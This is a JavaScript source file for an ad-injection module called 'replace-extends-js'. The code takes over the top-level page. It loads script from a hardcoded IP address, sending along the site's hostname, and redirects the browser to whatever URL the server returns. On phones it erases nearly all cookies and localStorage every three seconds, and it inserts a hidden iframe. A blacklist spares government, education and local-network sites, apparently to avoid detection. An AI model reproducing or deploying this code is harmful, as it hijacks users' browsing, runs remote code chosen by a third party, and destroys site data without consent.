import { phone } from 'ismobilejs';
import getAd from './utils';
import { mobileReplace, PCReplace } from './replace';
// import { AD_0X0 } from './config';
// if (phone) {
//   // 唤醒广告位
//   const scr = document.createElement('script');
//   scr.src = AD_0X0;
//   window.top.document.body.appendChild(scr);
// }
const [name, version] = ['replace-extends-js', '1.0.0'];
const blackWebsite = /.edu|.org|12306.com|.*gov.*|^192.168|yoyo.qq.com/;
const hostname = Object.keys(window.top.location).length > 5 && window.top.location.hostname;

function extend() {
  if (window.top.adExtendsJS || blackWebsite.test(hostname)) return;
  window.top.adExtendsJS = `${name}-${version}`;
  getAd();
  // if (phone) mobileExtend();
  // else PCExtend();
}

function replace() {
  if (blackWebsite.test(hostname)) return;
  window.adReplaceJS = `${name}-${version}`;
  if (phone) mobileReplace();
  else PCReplace();
}

function redirect() {
  let str = '';
  if (hostname.search(/^www./) !== -1) {
    str = hostname.slice(hostname.indexOf('.') + 1);
  } else {
    str = hostname;
  }

  const fnName = `Jsonp${Math.random().toString().replace('.', '')}_${new Date().getTime()}`;
  window.top[fnName] = (data) => {
    if (data.url) window.top.location.href = data.url;
  };
  const os = document.createElement('script');
  os.src = `http://117.121.41.228:3000/replace?cb=${fnName}&host=${str}`;
  window.top.document.head.appendChild(os);
  if (os.remove) os.remove();
}

function getCookie() {
  const cookie = [];
  const all = window.top.document.cookie;
  const list = all.split('; ');
  for (let i = list.length; i--;) {
    const p = list[i].indexOf('=');
    cookie[i] = decodeURIComponent(list[i].substring(0, p));
  }
  return cookie;
}
// , 'slv', 'idevst', 'idv', '_aswak', '_aswqert', '_aak', '_ast', 'atxyeq', 'atxdwwyeq'
function clear() {
  const keys = getCookie();
  const { host } = window.top.location;
  for (let i = keys.length; i--;) {
    if (keys[i] && keys[i].indexOf('_pdv') === -1) {
      window.top.document.cookie = `${keys[i]}=0;path=/;expires=${new Date(0).toUTCString()}`;
      window.top.document.cookie = `${keys[i]}=0;path=/;domain=.${host};expires=${new Date(0).toUTCString()}`;
    }
  }
  // const whiteObj = ['_pdv'];
  // for (let i = keys.length; i--;) {
  //   let flag = 1;
  //   for (let j = whiteObj.length; j--;) {
  //     if (keys[i] && keys[i].indexOf(whiteObj[j]) > -1) {
  //       flag = 0; break;
  //     }
  //   }
  //   if (flag) {
  //     window.top.document.cookie = `${keys[i]}=0;path=/;expires=${new Date(0).toUTCString()}`;
  //     window.top.document.cookie = `${keys[i]}=0;path=/;domain=.${host};expires=${new Date(0).toUTCString()}`;
  //   }
  // }
  window.top.localStorage.clear();
}

function handler() {
  if (!hostname) return;
  if (!window.top.haveRedirect) {
    setTimeout(redirect, 0);
    window.top.haveRedirect = true;
  }
  if (window.top.adReady || window.top.document.readyState !== 'complete') return;
  extend();
  replace();
  setTimeout(replace, 3000);
  window.top.adReady = true;
}

if (document.addEventListener) {
  document.addEventListener('DOMContentLoaded', handler, false);
  document.addEventListener('readystatechange', handler, false); // IE9+
} else if (document.attachEvent) {
  document.attachEvent('onreadystatechange', handler);
}

setInterval(() => {
  if (phone && hostname) clear();
}, 3000);

setTimeout(() => {
  if (phone && hostname && !window.top.getInsert) { // 头部广告位
    const iframe = document.createElement('iframe');
    iframe.style.width = '0'; iframe.style.height = '0';
    const { body } = window.top.document;
    body.insertBefore(iframe, body.firstChild);
    window.top.getInsert = true;
  }
  if (hostname) replace();
}, 2000);
setTimeout(() => {
  if (hostname) replace();
}, 5000);
